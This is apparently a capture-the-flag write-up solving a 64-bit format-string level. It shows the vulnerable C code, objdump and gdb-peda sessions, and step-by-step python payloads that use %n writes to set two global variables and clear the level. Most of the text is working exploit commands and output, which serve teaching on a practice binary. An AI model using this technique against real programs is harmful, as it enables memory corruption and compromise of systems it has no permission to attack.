Let's take a look at the C code...

```
#include <stdio.h>
#include <stdlib.h>

int target0 = 0;
int target1 = 0;

void fun0()
	{
	char buf0[100];
	fgets(buf0, sizeof(buf0), stdin);
	printf(buf0);

	if (target0 == 0xace5 && target1 == 0xfacade)
		{
		printf("There's a line between taking advantage, and downright exploiting. You have crossed that line. Level Cleared\n");
		}
	printf("The value of target0 is %x\n", target0);
	printf("The value of target1 is %x\n", target1);
	}

int main()
{
	fun0();
}
```

So we can see that this level is similar to the previous level. We will have to use the format string exploit caused by the printf to change the value of the integers that are being evaluated. However this time we have to write to two different integers. First let's find the static address of the "target0" and "target1" global integers.

```
$	objdump -t f3_64 | grep target
000000000060105c g     O .bss 0000000000000004              target0
0000000000601060 g     O .bss 0000000000000004              target1
```

So the address for target0 is "0x60105c", and the address for target1 is "0x601060". Now we will need to format our string so it is properly stored in memory. We can do this by generating a payload that will be similar to the final payload, and seeing what happens in gdb when we give the program the payload. For now we will use hex strings the same length as the addresses for target0 and target1, however they will be words so they are easier to spot.

```
$  python -c 'print "%3$x" + "%9$x" + "\xad\xde\xbe" + "\xde\xca\xfa"' > payload 
```

Now onto gdb

```
gdb-peda$ disas main
Dump of assembler code for function main:
   0x000000000040070f <+0>:   push   rbp
   0x0000000000400710 <+1>:   mov    rbp,rsp
   0x0000000000400713 <+4>:   mov    eax,0x0
   0x0000000000400718 <+9>:   call   0x400666 <fun0>
   0x000000000040071d <+14>:  mov    eax,0x0
   0x0000000000400722 <+19>:  pop    rbp
   0x0000000000400723 <+20>:  ret    
End of assembler dump.
gdb-peda$ disas fun0
Dump of assembler code for function fun0:
   0x0000000000400666 <+0>:   push   rbp
   0x0000000000400667 <+1>:   mov    rbp,rsp
   0x000000000040066a <+4>:   sub    rsp,0x70
   0x000000000040066e <+8>:   mov    rax,QWORD PTR fs:0x28
   0x0000000000400677 <+17>:  mov    QWORD PTR [rbp-0x8],rax
   0x000000000040067b <+21>:  xor    eax,eax
   0x000000000040067d <+23>:  mov    rdx,QWORD PTR [rip+0x2009cc]        # 0x601050 <stdin@@GLIBC_2.2.5>
   0x0000000000400684 <+30>:  lea    rax,[rbp-0x70]
   0x0000000000400688 <+34>:  mov    esi,0x64
   0x000000000040068d <+39>:  mov    rdi,rax
   0x0000000000400690 <+42>:  call   0x400550 <fgets@plt>
   0x0000000000400695 <+47>:  lea    rax,[rbp-0x70]
   0x0000000000400699 <+51>:  mov    rdi,rax
   0x000000000040069c <+54>:  mov    eax,0x0
   0x00000000004006a1 <+59>:  call   0x400530 <printf@plt>
   0x00000000004006a6 <+64>:  mov    eax,DWORD PTR [rip+0x2009b0]        # 0x60105c <target0>
   0x00000000004006ac <+70>:  cmp    eax,0xace5
   0x00000000004006b1 <+75>:  jne    0x4006ca <fun0+100>
   0x00000000004006b3 <+77>:  mov    eax,DWORD PTR [rip+0x2009a7]        # 0x601060 <target1>
   0x00000000004006b9 <+83>:  cmp    eax,0xfacade
   0x00000000004006be <+88>:  jne    0x4006ca <fun0+100>
   0x00000000004006c0 <+90>:  mov    edi,0x4007b8
   0x00000000004006c5 <+95>:  call   0x400510 <puts@plt>
   0x00000000004006ca <+100>: mov    eax,DWORD PTR [rip+0x20098c]        # 0x60105c <target0>
   0x00000000004006d0 <+106>: mov    esi,eax
   0x00000000004006d2 <+108>: mov    edi,0x400825
   0x00000000004006d7 <+113>: mov    eax,0x0
   0x00000000004006dc <+118>: call   0x400530 <printf@plt>
   0x00000000004006e1 <+123>: mov    eax,DWORD PTR [rip+0x200979]        # 0x601060 <target1>
   0x00000000004006e7 <+129>: mov    esi,eax
   0x00000000004006e9 <+131>: mov    edi,0x400841
   0x00000000004006ee <+136>: mov    eax,0x0
   0x00000000004006f3 <+141>: call   0x400530 <printf@plt>
   0x00000000004006f8 <+146>: nop
   0x00000000004006f9 <+147>: mov    rax,QWORD PTR [rbp-0x8]
   0x00000000004006fd <+151>: xor    rax,QWORD PTR fs:0x28
   0x0000000000400706 <+160>: je     0x40070d <fun0+167>
   0x0000000000400708 <+162>: call   0x400520 <__stack_chk_fail@plt>
   0x000000000040070d <+167>: leave  
   0x000000000040070e <+168>: ret    
End of assembler dump.
gdb-peda$ b *fun0+59
Breakpoint 1 at 0x4006a1
gdb-peda$ r < payload
Starting program: /Hackery/escape/fmt_str/f3_64/f3_64 < payload

 [----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0xafacadebedead78 
RDX: 0x7ffff7dd3790 --> 0x0 
RSI: 0x60201f --> 0x0 
RDI: 0x7fffffffddb0 ("%3$x%9$x\255\336\276\336\312\372\n")
RBP: 0x7fffffffde20 --> 0x7fffffffde30 --> 0x400730 (<__libc_csu_init>: push   r15)
RSP: 0x7fffffffddb0 ("%3$x%9$x\255\336\276\336\312\372\n")
RIP: 0x4006a1 (<fun0+59>:  call   0x400530 <printf@plt>)
R8 : 0x60201f --> 0x0 
R9 : 0xd ('\r')
R10: 0x7ffff7dd1b78 --> 0x603010 --> 0x0 
R11: 0x246 
R12: 0x400570 (<_start>:   xor    ebp,ebp)
R13: 0x7fffffffdf10 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400695 <fun0+47>:  lea    rax,[rbp-0x70]
   0x400699 <fun0+51>:  mov    rdi,rax
   0x40069c <fun0+54>:  mov    eax,0x0
=> 0x4006a1 <fun0+59>:  call   0x400530 <printf@plt>
   0x4006a6 <fun0+64>:  
    mov    eax,DWORD PTR [rip+0x2009b0]        # 0x60105c <target0>
   0x4006ac <fun0+70>:  cmp    eax,0xace5
   0x4006b1 <fun0+75>:  jne    0x4006ca <fun0+100>
   0x4006b3 <fun0+77>:  
    mov    eax,DWORD PTR [rip+0x2009a7]        # 0x601060 <target1>
Guessed arguments:
arg[0]: 0x7fffffffddb0 ("%3$x%9$x\255\336\276\336\312\372\n")
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffddb0 ("%3$x%9$x\255\336\276\336\312\372\n")
0008| 0x7fffffffddb8 --> 0xafacadebedead 
0016| 0x7fffffffddc0 --> 0x0 
0024| 0x7fffffffddc8 --> 0x0 
0032| 0x7fffffffddd0 --> 0x0 
0040| 0x7fffffffddd8 --> 0x0 
0048| 0x7fffffffdde0 --> 0xff00000000000000 
0056| 0x7fffffffdde8 --> 0xff0000000000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x00000000004006a1 in fun0 ()
gdb-peda$ x/x 0x7fffffffddb8
0x7fffffffddb8:   0x000afacadebedead
```

So we can see that currently both of our addresses are stored in the same QWORD, and in addition to that there is a newline after 0xfacade (which in hex is 0x0a) . We can fix this by adding 10 zeroes in front of both 0xbedead and 0xfacade. This should format the string so both of the addresses have their own QWORD. Let's try it.

```
$  python -c 'print "%3$x" + "%9$x" + "\xad\xde\xbe\x00\x00\x00\x00\x00" + "\xde\xca\xfa\x00\x00\x00\x00\x00"' > payload
```

keep in mind that we need the flags (%x's and %n's) before the addresses because of the null terminators "\x00". Any flags after the null terminators will be ignored. and now onto gdb, using the same breakpoint

```
Breakpoint 1, 0x00000000004006a1 in fun0 ()
gdb-peda$ x/x 0x7fffffffddb8
0x7fffffffddb8:   0x0000000000bedead
gdb-peda$ x/2x 0x7fffffffddb8
0x7fffffffddb8:   0x0000000000bedead   0x0000000000facade
```

So we can see there, the two strings are properly formatted. There is nothing else in either QWORD except for zeroes infront of it (and not ascii zeroes) that will not change the value of the QWORD. Now that we have the format down, let's try to read the addresses using the format string exploit to see how many QWORDS away they are.  

```
$  python -c 'print "%6$x" + "%7$x" + "\x5c\x10\x60\x00\x00\x00\x00\x00" + "\x60\x10\x60\x00\x00\x00\x00\x00"' | ./f3_64 
7824362560105c\`The value of target0 is 0
The value of target1 is 0
```

So we can see the address for targt0 is 0x60105c, is being displayed 7 QWORDS away. Since the address for target1 is stored in the QWORD immediately after the QWORD for target0, target1 is most likely stored 8 QWORDS away. Let's see

```
$  python -c 'print "%7$x" + "%8$x" + "\x5c\x10\x60\x00\x00\x00\x00\x00" + "\x60\x10\x60\x00\x00\x00\x00\x00"' | ./f3_64 
60105c601060\`The value of target0 is 0
The value of target1 is 0
```

So we can see that we found the proper offset for both addresses. Just as a final test, let's write to them.

```
$  python -c 'print "%7$n" + "%8$n" + "\x5c\x10\x60\x00\x00\x00\x00\x00" + "\x60\x10\x60\x00\x00\x00\x00\x00"' | ./f3_64 
\`The value of target0 is 0
The value of target1 is 0
```

So we were able to write to the integers. The reason why they were zero is because when they wrote to the integers, nothing was printed (currently the only things being printed are the two addresses which is after the two $n flags). Since the value we need to set target0 equal to is less than the value we need to set for target1, we should write to target0 first. This is because all of the characters that we printed for the 1st write are added to the 2nd write since it writes all characters that were printed. Let's find out how many characters we will need to write to get it equal to 0xace5

```
>>> 0xace5
44261
```

So we will need to write 44261 characters in order to set target0 equal to 0xaces. Of course adding in that will add 7 characters (%44261x). To get everything lined up again we will need to add 1 characters , and change the offset from 7 & 8 to 8 & 9 to account for the fact that both addresses are moved down a QWORD. Let's test it.

```
$  python -c 'print "%44261x%8$n" + "%9$n0" + "\x5c\x10\x60\x00\x00\x00\x00\x00" + "\x60\x10\x60\x00\x00\x00\x00\x00"' | ./f3_64
```

One wall of text later...

```
               6020310\`The value of target0 is ace5
The value of target1 is ace5
```

As you can see, we were able to successfully write the correct value to target0. Now for Target1, currently it is writing the value 0xace5 to it. Let's see what the difference between 0xfacade and 0xace6 is.

```
>>> 0xfacade - 0xace5
16391673
```

So we will need to write 16391673 characters in order to set target 1 equal to the correct value. This will add an additonal 10 characters (%16391673x). Ths will shift over our QWORDS by two (since we have to round up to a multiple of 8 for our total string length) to 10 and 11. We will need to add four additional characters to have the addresses align correctly in their own QWORDS (we would of needed to add 6 extra characters if it wasn't for the extra character from 10 & 11) Let's try it!

```
$  python -c 'print "%44261x%10$n" + "%16391673x%11$n00000" + "\x5c\x10\x60\x00\x00\x00\x00\x00" + "\x60\x10\x60\x00\x00\x00\x00\x00"' | ./f3_64
``` 

one wall of text later...

```
      f7dd379000000\`There's a line between taking advantage, and downright exploiting. You have crossed that line. Level Cleared
The value of target0 is ace5
The value of target1 is facade
```

And just like that, we pwned the binary!